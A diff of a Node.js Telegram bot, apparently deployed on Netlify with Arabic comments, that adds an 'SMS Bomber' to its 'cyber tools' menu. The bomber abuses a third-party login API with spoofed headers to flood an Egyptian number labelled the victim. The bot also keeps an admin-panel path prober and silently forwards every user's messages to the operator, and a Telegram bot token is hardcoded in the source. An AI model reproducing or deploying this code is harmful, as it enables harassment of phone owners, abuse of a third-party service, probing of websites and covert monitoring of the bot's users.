@@ -1,12 +1,9 @@
 const axios = require('axios');
 const crypto = require('crypto');
-const dns = require('dns');
 
 // ==========================================
-// ⚙️ إعدادات البوت والبيانات
+// ⚙️ الإعدادات
 // ==========================================
-// سيقوم الكود بجلب التوكن والأدمن ID تلقائياً من إعدادات Netlify لو كنت وضعتها هناك
-// أو يمكنك كتابتها هنا مباشرة للتجربة السريعة:
 const BOT_TOKEN = process.env.TELEGRAM_TOKEN || "8519648833:AAHeg8gNX7P1UZabWKcqeFJv0NAggRzS3Qs"; 
 const ADMIN_ID = process.env.ADMIN_ID || "1431886140"; 
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -15,74 +12,89 @@ const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 // 🛠️ دوال الأدوات (Helper Functions)
 // ==========================================
 
-// 1. فحص IP
-async function checkIP(target) {
+// 1. أداة SMS Spam (الجديدة المحولة من بايثون)
+async function sendSMS(number) {
+    // التحقق من تنسيق الرقم المصري
+    if (!number.startsWith("2")) {
+        if (number.startsWith("01") && number.length === 11) {
+            number = "2" + number;
+        } else {
+            return "❌ الرقم غير صحيح. يجب أن يكون رقم مصري (01xxxxxxxxx).";
+        }
+    }
+
+    const url = "https://api.twistmena.com/music/Dlogin/sendCode";
+    
+    // محاكاة الهيدرز لعدم الحظر (كما في كود البايثون)
+    const headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Referer": "https://www.google.com",
+        "Origin": "https://www.example.com"
+    };
+
+    // توليد قيمة عشوائية
+    const randomVal = Math.random().toString(36).substring(7);
+    const payload = { "dial": number, "randomValue": randomVal };
+
     try {
-        const response = await axios.get(`http://ip-api.com/json/${target}`);
-        const data = response.data;
-        if (data.status === 'fail') return "❌ العنوان غير صحيح أو لا يوجد بيانات.";
-        
-        return `🌍 **تقرير IP:**\n` +
-               `🔹 الـ IP: \`${data.query}\`\n` +
-               `🔹 الدولة: ${data.country} (${data.countryCode})\n` +
-               `🔹 المدينة: ${data.city}\n` +
-               `🔹 الشبكة (ISP): ${data.isp}\n` +
-               `🔹 النطاق الزمني: ${data.timezone}`;
-    } catch (e) { return "❌ خطأ في الاتصال بخدمة IP."; }
+        const res = await axios.post(url, payload, { headers: headers, timeout: 3000 });
+        if (res.status === 200) {
+            return `✅ **تم الإرسال بنجاح!**\nالضحية: \`${number}\`\nالمصدر: TwistMena API`;
+        } else {
+            return `❌ فشل الإرسال. كود الخطأ: ${res.status}`;
+        }
+    } catch (e) {
+        return `❌ خطأ في الاتصال بالخدمة: ${e.message}`;
+    }
 }
 
-// 2. كاشف لوحة التحكم (Admin Finder)
+// 2. فحص IP
+async function checkIP(target) {
+    try {
+        const res = await axios.get(`http://ip-api.com/json/${target}`);
+        const data = res.data;
+        if (data.status === 'fail') return "❌ العنوان غير صحيح.";
+        return `🌍 **تقرير IP:**\n🔹 IP: \`${data.query}\`\n🔹 الدولة: ${data.country}\n🔹 المدينة: ${data.city}\n🔹 الشبكة: ${data.isp}`;
+    } catch (e) { return "❌ خطأ في الاتصال."; }
+}
+
+// 3. كاشف لوحة التحكم
 async function findAdmin(url) {
     if (!url.startsWith('http')) url = 'http://' + url;
-    // قائمة مختصرة لتناسب وقت السيرفر (Serverless Timeout)
-    const paths = ['/admin', '/login', '/wp-admin', '/cpanel', '/dashboard', '/admin/login.php'];
+    const paths = ['/admin', '/login', '/wp-admin', '/cpanel', '/dashboard'];
     let found = "";
-    
-    // فحص المسارات بالتوازي (Parallel) لسرعة قصوى
-    const promises = paths.map(async (path) => {
+    const checks = paths.map(async (path) => {
         try {
             const res = await axios.get(url + path, { timeout: 2000, validateStatus: false });
             if (res.status === 200) found += `✅ وجدنا: ${url + path}\n`;
         } catch (e) {}
     });
-    
-    await Promise.all(promises);
-    return found ? found : "❌ لم يتم العثور على مسارات مشهورة في هذه القائمة السريعة.";
+    await Promise.all(checks);
+    return found || "❌ لم يتم العثور على مسارات شائعة.";
 }
 
-// 3. فحص الهيدرز (Headers)
+// 4. فحص الهيدرز
 async function checkHeaders(url) {
     if (!url.startsWith('http')) url = 'http://' + url;
     try {
-        const res = await axios.head(url, { timeout: 5000 });
-        let headers = "";
-        for (const [key, value] of Object.entries(res.headers)) {
-            headers += `🔹 **${key}:** \`${value}\`\n`;
-        }
-        return `📑 **بيانات الهيدرز (Headers):**\n\n${headers}`.substring(0, 4000);
-    } catch (e) { return "❌ لا يمكن الوصول للموقع أو الرابط خطأ."; }
+        const res = await axios.head(url, { timeout: 4000 });
+        const headers = Object.entries(res.headers).map(([k, v]) => `🔹 ${k}: \`${v}\``).join('\n');
+        return `📑 **Headers:**\n${headers}`.substring(0, 3000);
+    } catch (e) { return "❌ خطأ في الرابط."; }
 }
 
-// 4. بريد مؤقت
+// 5. بريد مؤقت
 async function getTempMail() {
     try {
         const res = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
         return `📧 **بريدك المؤقت:**\n\`${res.data[0]}\`\n\n(استخدم موقع 1secmail لقراءة الرسائل)`;
-    } catch (e) { return "❌ خطأ في خدمة البريد."; }
-}
-
-// 5. كسر هاش MD5 (قائمة بسيطة)
-function crackMD5(hash) {
-    const wordlist = ['123456', 'password', 'admin', 'welcome', '12345678', 'root', '12345', 'user'];
-    for (let word of wordlist) {
-        const md5 = crypto.createHash('md5').update(word).digest('hex');
-        if (md5 === hash) return `✅ **تم الكسر!** الكلمة هي: \`${word}\``;
-    }
-    return "❌ فشل الكسر (غير موجود في القائمة البسيطة).";
+    } catch (e) { return "❌ خطأ في الخدمة."; }
 }
 
 // ==========================================
-// 🚀 المعالج الرئيسي (Main Handler)
+// 🚀 المعالج الرئيسي
 // ==========================================
 exports.handler = async function(event, context) {
     if (event.httpMethod !== "POST") return { statusCode: 405, body: "Method Not Allowed" };
@@ -94,141 +106,72 @@ exports.handler = async function(event, context) {
         const chatId = body.message.chat.id;
         const text = body.message.text.trim();
         const firstName = body.message.from.first_name;
-
+        
         let replyText = "";
         let keyboard = null;
 
-        // -- القائمة الرئيسية --
-        const mainMenu = {
+        // القائمة الرئيسية
+        const mainMenuMarkup = {
             keyboard: [
-                [{ text: "🌍 معلومات IP" }, { text: "❓ معلومات Whois" }],
-                [{ text: "🔍 بحث يوزر" }, { text: "🌐 فحص منافذ" }],
-                [{ text: "🚪 كاشف أدمن" }, { text: "📑 فحص Headers" }],
-                [{ text: "🔐 تشفير Base64" }, { text: "🔨 كسر MD5" }],
-                [{ text: "📧 بريد مؤقت" }, { text: "🔑 توليد باسوورد" }]
+                [{ text: "💣 إسبام SMS" }, { text: "🌍 معلومات IP" }],
+                [{ text: "🔍 فحص يوزر" }, { text: "🚪 كاشف لوحة التحكم" }],
+                [{ text: "📑 فحص الهيدرز" }, { text: "📧 بريد مؤقت" }],
+                [{ text: "🔐 تشفير Base64" }, { text: "🆔 معرفي (ID)" }]
             ],
-            resize_keyboard: true,
-            one_time_keyboard: false
+            resize_keyboard: true
         };
 
-        // --- معالجة الأوامر والنصوص ---
-
         if (text === "/start") {
-            replyText = `👮‍♂️ **أهلاً بك يا ${firstName} في بوت الأدوات السيبرانية (Node.js Edition)**\n\n` +
-                        `اضغط على الأزرار بالأسفل لمعرفة كيفية استخدام كل أداة 👇`;
-            keyboard = mainMenu;
-
-        } 
-        // 1. IP Info
-        else if (text === "🌍 معلومات IP") {
-            replyText = "💡 **طريقة الاستخدام:**\nأرسل الأمر متبوعاً بالدومين أو IP.\nمثال: `/ip google.com`";
-        } else if (text.startsWith("/ip ")) {
-            const target = text.split(" ")[1];
-            replyText = await checkIP(target);
+            replyText = `👮‍♂️ **أهلاً بك يا ${firstName}**\n\nتمت إضافة أداة **SMS Bomber** الجديدة للقائمة 👇`;
+            keyboard = mainMenuMarkup;
         }
 
-        // 2. Whois (مبسط)
-        else if (text === "❓ معلومات Whois") {
-            replyText = "💡 **طريقة الاستخدام:**\nأرسل الأمر: `/whois google.com`";
-        } else if (text.startsWith("/whois ")) {
-            const target = text.split(" ")[1];
-            replyText = `ℹ️ للحصول على معلومات Whois كاملة لهذا النطاق، يرجى زيارة:\nhttps://who.is/whois/${target}`;
+        // --- أداة SMS Spam ---
+        else if (text === "💣 إسبام SMS") {
+            replyText = "😈 **مود الإسبام (TwistMena API)**\n\nأرسل الأمر:\n`/sms 01xxxxxxxxx`\n\n*(ملاحظة: سيتم إرسال رسالة واحدة لكل ضغطة لتجنب حظر السيرفر)*";
+        }
+        else if (text.startsWith("/sms ")) {
+            const number = text.split(" ")[1];
+            replyText = "⏳ جاري تنفيذ الهجوم...";
+            // إرسال رد الانتظار (اختياري، هنا نرسل النتيجة فوراً)
+            replyText = await sendSMS(number);
         }
 
-        // 3. User Search
-        else if (text === "🔍 بحث يوزر") {
-            replyText = "💡 **طريقة الاستخدام:**\nأرسل الأمر: `/user aboelfadl`";
-        } else if (text.startsWith("/user ")) {
-            const user = text.split(" ")[1];
-            replyText = `🔍 **نتائج البحث المبدئي عن ${user}:**\n\n` +
-                        `👤 Facebook: facebook.com/${user}\n` +
-                        `📸 Instagram: instagram.com/${user}\n` +
-                        `🐦 Twitter: twitter.com/${user}\n` +
-                        `🐙 GitHub: github.com/${user}\n` +
-                        `🎵 TikTok: tiktok.com/@${user}`;
-        }
+        // --- باقي الأدوات القديمة ---
+        else if (text === "🌍 معلومات IP") replyText = "💡 أرسل الأمر:\n`/ip google.com`";
+        else if (text.startsWith("/ip ")) replyText = await checkIP(text.split(" ")[1]);
 
-        // 4. Ports (Simulated for Safety)
-        else if (text === "🌐 فحص منافذ") {
-            replyText = "⚠️ فحص المنافذ الكامل محظور على السيرفرات السحابية المجانية.\n" + 
-                        "💡 **جرب الفحص السريع:** `/scan google.com`";
-        } else if (text.startsWith("/scan ")) {
-            replyText = `🔒 **فحص المنافذ (Simulation):**\n\n` +
-                        `يتم الآن فحص المنافذ الأساسية (80, 443)...\n` +
-                        `⚠️ *ملاحظة:* للحصول على فحص حقيقي استخدم Nmap على جهازك الشخصي.`;
-        }
+        else if (text === "🚪 كاشف لوحة التحكم") replyText = "💡 أرسل الأمر:\n`/admin example.com`";
+        else if (text.startsWith("/admin ")) replyText = await findAdmin(text.split(" ")[1]);
 
-        // 5. Admin Finder
-        else if (text === "🚪 كاشف أدمن") {
-            replyText = "💡 **طريقة الاستخدام:**\nأرسل الأمر: `/admin google.com`";
-        } else if (text.startsWith("/admin ")) {
-            const url = text.split(" ")[1];
-            replyText = "⏳ جاري الفحص... (قد يستغرق بضع ثوانٍ)";
-            // نرسل رسالة انتظار أولاً (اختياري، هنا سنرسل النتيجة مباشرة لسرعة الرد)
-            replyText = await findAdmin(url);
-        }
+        else if (text === "📑 فحص الهيدرز") replyText = "💡 أرسل الأمر:\n`/head example.com`";
+        else if (text.startsWith("/head ")) replyText = await checkHeaders(text.split(" ")[1]);
 
-        // 6. Headers
-        else if (text === "📑 فحص Headers") {
-            replyText = "💡 **طريقة الاستخدام:**\nأرسل الأمر: `/head google.com`";
-        } else if (text.startsWith("/head ")) {
-            const url = text.split(" ")[1];
-            replyText = await checkHeaders(url);
-        }
+        else if (text === "📧 بريد مؤقت") replyText = await getTempMail();
 
-        // 7. Base64
-        else if (text === "🔐 تشفير Base64") {
-            replyText = "💡 **طريقة الاستخدام:**\nللتشفير: `/en النص`\nلفك التشفير: `/de النص_المشفر`";
-        } else if (text.startsWith("/en ")) {
-            const raw = text.replace("/en ", "");
-            const encoded = Buffer.from(raw).toString('base64');
-            replyText = `🔒 **تشفير:**\n\`${encoded}\``;
-        } else if (text.startsWith("/de ")) {
-            const raw = text.replace("/de ", "");
-            const decoded = Buffer.from(raw, 'base64').toString('utf-8');
-            replyText = `🔓 **فك تشفير:**\n\`${decoded}\``;
-        }
+        else if (text === "🔐 تشفير Base64") replyText = "💡 أرسل الأمر:\n`/en النص`";
+        else if (text.startsWith("/en ")) replyText = `🔒 **مشفر:**\n\`${Buffer.from(text.replace("/en ", "")).toString('base64')}\``;
 
-        // 8. MD5 Crack
-        else if (text === "🔨 كسر MD5") {
-            replyText = "💡 **طريقة الاستخدام:**\nأرسل الأمر: `/md5 الهاش`";
-        } else if (text.startsWith("/md5 ")) {
-            const hash = text.split(" ")[1];
-            replyText = crackMD5(hash);
-        }
+        else if (text === "🆔 معرفي (ID)") replyText = `🆔 ID: \`${chatId}\``;
 
-        // 9. Temp Mail
-        else if (text === "📧 بريد مؤقت") {
-            replyText = await getTempMail();
-        }
-
-        // 10. Password Generator
-        else if (text === "🔑 توليد باسوورد") {
-            const pass = crypto.randomBytes(8).toString('hex') + "!@#";
-            replyText = `🔑 **كلمة مرور مقترحة:**\n\`${pass}\``;
-        }
-
-        // رسالة افتراضية
         else {
-            replyText = "⚠️ لم أفهم هذا الأمر. استخدم القائمة بالأسفل.";
-            keyboard = mainMenu;
+            replyText = "⚠️ أمر غير معروف، استخدم القائمة.";
+            keyboard = mainMenuMarkup;
         }
 
         // إرسال الرد
-        const payload = {
+        await axios.post(TELEGRAM_API, {
             chat_id: chatId,
             text: replyText,
-            parse_mode: "Markdown"
-        };
-        if (keyboard) payload.reply_markup = keyboard;
+            parse_mode: "Markdown",
+            reply_markup: keyboard
+        });
 
-        await axios.post(TELEGRAM_API, payload);
-
-        // مراقبة النشاط (إرسال نسخة للأدمن إذا لم يكن هو المستخدم)
+        // مراقبة النشاط (إرسال نسخة للأدمن)
         if (String(chatId) !== ADMIN_ID) {
             await axios.post(TELEGRAM_API, {
                 chat_id: ADMIN_ID,
-                text: `🚨 **نشاط جديد:**\n👤 ${firstName}\n📝 ${text}`
+                text: `🚨 **استخدام جديد:**\n👤 ${firstName}\n📝 ${text}`
             });
         }
 
